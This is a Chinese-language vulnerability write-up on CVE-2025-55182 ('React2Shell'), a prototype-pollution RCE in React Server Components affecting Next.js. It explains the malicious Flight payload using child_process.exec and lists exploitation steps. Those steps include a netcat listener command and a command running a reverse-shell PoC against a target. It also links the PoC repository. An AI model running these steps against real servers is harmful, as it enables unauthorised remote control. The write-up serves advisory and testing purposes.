## CVE-2025-55182 - React Server Components, Next.js, Shopify Hydrogen, Gatsby 5 远程代码执行 (RCE), 原型链污染

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE), 原型链污染

**影响应用:** React Server Components, Next.js, Shopify Hydrogen, Gatsby 5

**危害等级:** 严重

**CVSS评分:** 高 (具体CVSS评分未披露, 但根据描述为核弹级、致命、高危RCE)

**影响版本:** Next.js 15.x 系列, Next.js 16.x 系列 (特别是 15.0.0-16.0.6)

**利用条件:** 无需认证, 网络可访问

**POC 可用性:** 10/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-55182是一个存在于React Server Components (RSC)架构中的致命远程代码执行漏洞，主要影响使用RSC技术的框架，包括Next.js、Shopify Hydrogen和Gatsby 5。该漏洞被称为“React2Shell”，其核心问题在于React Server Components的“Flight”协议反序列化机制对对象属性访问路径（如__proto__、constructor）的处理不当，导致原型链污染。攻击者可以通过精心构造的请求，在未经认证的情况下，操纵服务端组件渲染过程，最终实现任意代码执行。腾讯、Freebuf等安全团队将其定性为“核弹级”和“致命漏洞”，并已观察到大规模实际利用，首例Windows攻击尝试可追溯至2025年12月4日，表明其影响范围广且危害巨大。

**POC有效性分析:**
提供的Python POC脚本`CVE-2025-55182-revshell.py`是一个高度有效且功能完整的远程代码执行工具。该脚本利用了React Flight协议中的反序列化漏洞，通过向目标服务器的`/_next/static/chunks/react-flight`端点发送特制的`multipart/form-data`请求来触发漏洞。POC的核心在于构造一个包含`{"__type":"Function","code":"..."}`结构的恶意JSON-like字符串，并将其作为multipart表单数据的一部分发送。当服务器端处理此数据时，由于对用户输入缺乏充分校验，`__type`字段被解释为函数类型，而`code`字段的内容则被动态解析并执行。脚本利用`global.process.mainModule.require('child_process').exec()`这一Node.js常用方法来执行系统命令，从而实现任意命令执行。为了提高利用的成功率和跨平台兼容性，该POC内置了三种常见的反弹shell负载：Bash shell、Netcat shell和PowerShell shell。这意味着无论目标服务器是Linux（最常见）还是Windows环境（包括Azure部署），POC都有很大概率成功建立反弹shell连接。脚本设计简洁，用户只需提供目标URL和监听地址（LHOST:LPORT），即可“一键”获取反弹shell，无需复杂交互，充分体现了其“完整利用”的特性。通过对HTTP响应状态码的打印，用户可以实时了解payload的投递情况，这使得该POC在实战和测试中都非常实用和可靠。

**利用步骤:**
1.  **确定目标:** 识别运行未打补丁的Next.js应用程序（特别是15.x或16.x版本）的服务器。
2.  **设置监听器:** 在攻击者控制的机器上，使用Netcat或其他工具启动一个监听器，等待目标服务器的反弹shell连接。例如：`nc -lvnp <LPORT>`。
3.  **执行POC:** 运行提供的Python POC脚本，并传入目标URL和监听地址：
    `python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`
4.  **接收反弹Shell:** POC脚本会自动向目标发送包含不同反弹shell命令的恶意请求。一旦其中一个请求成功利用漏洞，目标服务器将执行相应的命令，并通过网络将shell连接反弹回攻击者的监听器。
5.  **远程控制:** 攻击者通过监听器接收到反弹shell后，即可在目标服务器上执行任意系统命令，实现完全的远程代码执行控制。

**投毒风险分析:**
对`CVE-2025-55182-revshell.py`这个POC代码的投毒风险评估结果为极低（10%）。这种低风险级别是基于对代码的全面审阅和其透明化特性得出的。首先，该脚本完全采用标准Python库，包括`requests`用于发送HTTP请求，`sys`用于处理命令行参数，以及`time`用于简单的延迟。这些都是Python生态系统中广受信任和广泛使用的模块，不涉及任何非官方、未知或需要特殊权限的第三方依赖，因此不存在通过引入可疑库进行供应链攻击的风险。

其次，代码本身没有任何形式的混淆、加密或封装。其逻辑结构清晰明了，从命令行参数解析到HTTP请求的构建，再到反弹shell负载的生成和发送，每一步都清晰可见。这意味着任何安全研究人员或开发者都可以轻松地审查代码，理解其确切功能，并验证其不包含任何隐藏的恶意行为。这种透明度是评估安全工具风险时的关键因素。

再者，脚本的“恶意”功能仅限于它所承载和发送的反弹shell命令。这些命令（Bash、Netcat、PowerShell反弹shell）是业界标准的渗透测试技术，旨在验证远程代码执行漏洞的实际效果。它们作为攻击载荷被发送到目标系统执行，而不是POC脚本自身执行的恶意代码。POC脚本自身的主要功能是构造并发送HTTP请求。它不会在执行POC的本地机器上安装后门、窃取数据、修改系统配置或执行其他未声明的行为。它唯一对外建立的网络连接是向用户指定的目标URL发送漏洞利用请求。

最后，脚本的行为是可预测且受限的。它不会尝试探测其他网络资源、连接到未知的C2服务器，或者进行任何超出预期范围的操作。其唯一目的就是针对给定的目标，尝试触发CVE-2025-55182漏洞以获取一个反弹shell。因此，对于旨在进行防御性安全研究和漏洞验证的组织而言，使用此POC脚本进行测试时，其自身带来的“投毒”风险可以忽略不计。任何潜在的危害都将仅限于被测试的、实际存在漏洞的目标系统，而不是执行POC的环境。


**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/
